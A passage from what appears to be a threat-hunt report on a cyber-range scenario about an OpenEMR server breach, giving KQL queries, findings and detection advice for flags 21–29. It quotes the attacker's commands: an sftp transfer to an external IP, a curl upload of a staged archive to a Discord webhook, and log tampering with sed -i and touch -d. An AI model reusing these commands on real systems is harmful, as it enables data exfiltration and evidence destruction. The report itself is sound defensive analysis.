| extend JoinKey=1
| join kind=inner (shells | extend JoinKey=1) on JoinKey
| where ShellTime between (PyTime .. PyTime + 1m)
| project PyTime, PyPid, ShellTime, ShellPid, ShellCmd
| order by PyTime asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 21_RockyClinicOpenEMR.png" width="900" alt="Flag 21 Screenshot">
</p>

### 🛠️ Detection Recommendation

Correlate scripting interpreter network activity with child shell processes.

</details>

---

<details>
<summary id="-flag-22">🚩 <strong>Flag 22: Staged Archive Identification</strong></summary>

### 🎯 Objective

Identify the archive prepared for transfer.

### 📌 Finding

The staged archive was:

`integration_state_2026-02-10_22-00-01.tar.gz`

### 🔍 Evidence

| Field         | Value                                        |
| ------------- | -------------------------------------------- |
| Archive       | integration_state_2026-02-10_22-00-01.tar.gz |
| Transfer Tool | scp                                          |
| Destination   | External host                                |

### 💡 Why it matters

The staged archive represented the data bundle prepared before exfiltration.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where FileName == "scp"
| project Timestamp, AccountName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 22_RockyClinicOpenEMR.png" width="900" alt="Flag 22 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on archive files transferred externally soon after local staging activity.

</details>

---

<details>
<summary id="-flag-23">🚩 <strong>Flag 23: First Exfiltration Attempt</strong></summary>

### 🎯 Objective

Identify the failed structured transfer attempt.

### 📌 Finding

The failed transfer was tied to this initiating command:

`/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l streetrack -s -- 20.62.27.80 sftp`

### 🔍 Evidence

| Field        | Value                   |
| ------------ | ----------------------- |
| Tool         | ssh/sftp                |
| Remote IP    | 20.62.27.80             |
| Result       | Failed transfer attempt |
| Source Table | DeviceNetworkEvents     |

### 💡 Why it matters

The attacker attempted a structured transfer first, but network controls interfered and forced a pivot.

### 🔧 KQL Query Used

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where InitiatingProcessCommandLine has_any ("scp", "sftp", "20.62.27.80")
| project Timestamp, ActionType, RemoteIP, RemotePort, InitiatingProcessCommandLine
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 23_RockyClinicOpenEMR.png" width="900" alt="Flag 23 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on failed outbound SFTP/SSH transfers to external destinations from application hosts.

</details>

---

<details>
<summary id="-flag-24">🚩 <strong>Flag 24: Successful Exfiltration Pivot</strong></summary>

### 🎯 Objective

Identify the command line that successfully transferred data out.

### 📌 Finding

The attacker pivoted to a third-party SaaS platform using `curl`:

`curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/[REDACTED]`

### 🔍 Evidence

| Field    | Value                                        |
| -------- | -------------------------------------------- |
| Tool     | curl                                         |
| Archive  | integration_state_2026-02-10_22-00-01.tar.gz |
| Platform | Discord webhook                              |
| Behavior | Successful SaaS upload                       |

### 💡 Why it matters

The attacker used legitimate SaaS infrastructure to blend exfiltration traffic with normal HTTPS activity.

### 🔧 KQL Query Used

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where InitiatingProcessCommandLine has "integration_state_2026-02-10_22-00-01.tar.gz"
| project Timestamp, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 24_RockyClinicOpenEMR.png" width="900" alt="Flag 24 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on `curl -F file=@` uploads to SaaS endpoints from servers.

</details>

---

<details>
<summary id="-flag-25">🚩 <strong>Flag 25: Exfiltration Endpoint</strong></summary>

### 🎯 Objective

Identify the IP and port that carried the successful exfiltration.

### 📌 Finding

The exfiltration endpoint was:

`162.159.135.232:443`

### 🔍 Evidence

| Field            | Value               |
| ---------------- | ------------------- |
| RemoteIP         | 162.159.135.232     |
| RemotePort       | 443                 |
| Tool             | curl                |
| Destination Type | HTTPS SaaS endpoint |

### 💡 Why it matters

The attacker used encrypted web traffic to transfer data out, making it harder to distinguish from normal HTTPS traffic.

### 🔧 KQL Query Used

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where InitiatingProcessCommandLine has "curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz"
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessCommandLine
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 25_RockyClinicOpenEMR.png" width="900" alt="Flag 25 Screenshot">
</p>

### 🛠️ Detection Recommendation

Correlate outbound HTTPS uploads with local archive creation and command-line upload tools.

</details>

---

<details>
<summary id="-flag-26">🚩 <strong>Flag 26: Selective Log Erasure</strong></summary>

### 🎯 Objective

Count distinct `sed -i` delete operations across `/var/log/secure` and `/var/log/messages`.

### 📌 Finding

The operator ran:

`12`

distinct `sed -i` delete operations.

### 🔍 Evidence

| Field                      | Value                                  |
| -------------------------- | -------------------------------------- |
| Log Files                  | `/var/log/secure`, `/var/log/messages` |
| Tool                       | sed                                    |
| Distinct Delete Operations | 12                                     |

### 💡 Why it matters

The attacker selectively removed evidence rather than wiping logs entirely, showing deliberate cleanup.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-11T16:13:00Z) .. datetime(2026-02-11T16:16:00Z))
| where DeviceName has "rocky83"
| where FileName == "sed"
| where ProcessCommandLine has "sed -i"
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages")
| summarize DistinctDeleteOps=dcount(ProcessCommandLine), Commands=make_set(ProcessCommandLine)
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 26_RockyClinicOpenEMR.png" width="900" alt="Flag 26 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on `sed -i` operations targeting system logs.

</details>

---

<details>
<summary id="-flag-27">🚩 <strong>Flag 27: Log Manipulation Primitive</strong></summary>

### 🎯 Objective

Identify the binary used to manipulate the log files.

### 📌 Finding

The binary was:

`sed`

### 🔍 Evidence

| Field           | Value                     |
| --------------- | ------------------------- |
| Binary          | sed                       |
| Command Pattern | `sed -i ... /var/log/...` |
| Target Logs     | secure, messages          |

### 💡 Why it matters

`sed -i` is a common way to surgically remove or alter lines without opening an editor.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-11T16:13:00Z) .. datetime(2026-02-11T16:16:00Z))
| where DeviceName has "rocky83"
| where ProcessCommandLine has "sed -i"
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 27_RockyClinicOpenEMR.png" width="900" alt="Flag 27 Screenshot">
</p>

### 🛠️ Detection Recommendation

Create detections for in-place log editing with `sed`, `perl`, or `awk`.

</details>

---

<details>
<summary id="-flag-28">🚩 <strong>Flag 28: Timeline Distortion</strong></summary>

### 🎯 Objective

Identify the forged timestamp applied to `/var/log/messages`.

### 📌 Finding

The attacker backdated `/var/log/messages` to:

`2026-02-06 12:00:00`

### 🔍 Evidence

| Field            | Value                                              |
| ---------------- | -------------------------------------------------- |
| Target File      | `/var/log/messages`                                |
| Tool             | touch                                              |
| Command          | `touch -d "2026-02-06 12:00:00" /var/log/messages` |
| Forged Timestamp | `2026-02-06 12:00:00`                              |

### 💡 Why it matters

Backdating log files can distort incident timelines and hide the order of attacker activity.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-11T16:13:00Z) .. datetime(2026-02-11T16:20:00Z))
| where DeviceName has "rocky83"
| where ProcessCommandLine has "/var/log/messages"
| where ProcessCommandLine has_any ("touch", "-d")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 28_RockyClinicOpenEMR.png" width="900" alt="Flag 28 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on `touch -d` or `touch -t` targeting `/var/log` files.

</details>

---

<details>
<summary id="-flag-29">🚩 <strong>Flag 29: Cleanup Alert Classification</strong></summary>

### 🎯 Objective

Identify the EDR alert classification assigned to the timestamp modification activity.

### 📌 Finding

The alert classified the activity as:

`["Indicator Removal (T1070)","Timestamp (T1070.006)"]`

### 🔍 Evidence

| Field            | Value                                                   |
| ---------------- | ------------------------------------------------------- |
| Alert Title      | Suspicious timestamp modification                       |
| AttackTechniques | `["Indicator Removal (T1070)","Timestamp (T1070.006)"]` |
| Source Tables    | AlertInfo, AlertEvidence                                |

### 💡 Why it matters

The EDR correctly classified the cleanup behavior as indicator removal and timestomping.

### 🔧 KQL Query Used

```kql
AlertEvidence
| where Timestamp between (datetime(2026-02-11T16:00:00Z) .. datetime(2026-02-11T16:30:00Z))
| where DeviceName has "rocky83"
| join kind=inner (
    AlertInfo
    | project AlertId, Title, AttackTechniques
) on AlertId
| project Timestamp, AlertId, Title, AttackTechniques, DeviceName, EntityType
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 29_RockyClinicOpenEMR.png" width="900" alt="Flag 29 Screenshot">
</p>

### 🛠️ Detection Recommendation

Ensure EDR alert classifications are reviewed and mapped back to process and file telemetry for validation.

</details>

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps

* Initial activity blended into normal administration and did not generate obvious alerts.
* Suspicious remote logons were not immediately tied to later process activity.
* Docker inspection and database access commands were not blocked or escalated.
* Sensitive environment files under `/etc` were readable by an interactive account.
* Service file creation under `/etc/systemd/system` was not immediately treated as high severity.
* Archive creation in operational-looking directories was not automatically correlated with outbound transfers.
* Failed transfer attempts did not prevent later successful SaaS-based exfiltration.
* Selective log editing occurred before timeline manipulation alerts were fully reviewed.

### Recommendations

* Alert on privileged remote logons from new or unusual external IPs.
* Monitor `sudo -i` sessions and correlate them with Docker and system file access.
* Detect `docker exec`, `docker inspect`, and database utilities launched by interactive users.
* Restrict access to Docker volume paths and sensitive env files under `/etc`.
* Alert on creation or modification of systemd unit files.
* Detect archive creation followed by outbound transfer activity.
* Monitor command-line uploads using `curl`, especially `curl -F file=@`.
* Block or inspect outbound traffic to unapproved SaaS webhook endpoints.
* Alert on `sed -i`, `touch -d`, and `touch -t` against `/var/log` files.
* Build detections that chain weak signals into a high-confidence attack narrative.

---

## 🧾 Final Assessment

The Rocky Clinic OpenEMR breach demonstrates a quiet, hands-on-keyboard intrusion where the attacker blended into administrative workflows and avoided noisy actions. The operator used valid accounts, Docker tooling, systemd persistence, service-like identity naming, and operational-looking staging paths to reduce suspicion. The most serious activity included database discovery, credential exposure through environment files, reverse shell execution, archive staging, successful SaaS-based exfiltration, and selective log tampering.

Overall, this hunt shows the importance of correlating identity, process, file, network, and alert telemetry. None of the individual actions alone looked like ransomware or a high-noise compromise, but the full timeline revealed a complete operational compromise.

---

## 📎 Analyst Notes

* This report is based on a controlled cyber range threat hunt scenario.
* Evidence was reconstructed using Microsoft Sentinel advanced hunting tables.
* Screenshot placeholders should be replaced with the analyst’s own images under `/assets`.
* Sensitive URLs, tokens, and webhook values should be redacted before publishing publicly.
* The report is structured for GitHub portfolio review, interviews, and technical discussion.

---
